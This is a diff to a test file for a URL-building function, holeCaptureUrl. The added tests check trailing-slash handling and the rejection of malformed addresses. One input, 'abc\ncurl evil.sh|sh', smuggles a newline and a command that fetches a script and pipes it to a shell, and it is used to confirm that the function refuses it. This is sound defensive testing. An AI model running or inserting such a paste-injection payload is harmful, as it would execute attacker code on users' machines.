@@ -23,9 +23,21 @@ describe("holeCaptureUrl", () => {
     ).toBe("http://localhost:3000/abc123");
   });
 
-  it("never returns a bare path", () => {
-    expect(holeCaptureUrl("abc123", "", "http://localhost:5173")).not.toMatch(
-      /^\//,
-    );
+  it("does not double the separator when the base carries a trailing slash", () => {
+    expect(
+      holeCaptureUrl("abc123", "http://localhost:3000/", "http://x.example"),
+    ).toBe("http://localhost:3000/abc123");
+  });
+
+  // The address comes straight off the route, so it is whatever the visitor
+  // typed. Copying it into a terminal is the point of this string, which makes
+  // an injected newline a way to run a second command on paste.
+  it("refuses an address that is not a bare six-character token", () => {
+    const origin = "https://requesthole.example";
+    expect(holeCaptureUrl("abc\ncurl evil.sh|sh", "", origin)).toBeNull();
+    expect(holeCaptureUrl("abc12", "", origin)).toBeNull();
+    expect(holeCaptureUrl("abc1234", "", origin)).toBeNull();
+    expect(holeCaptureUrl("abc/12", "", origin)).toBeNull();
+    expect(holeCaptureUrl("", "", origin)).toBeNull();
   });
 });
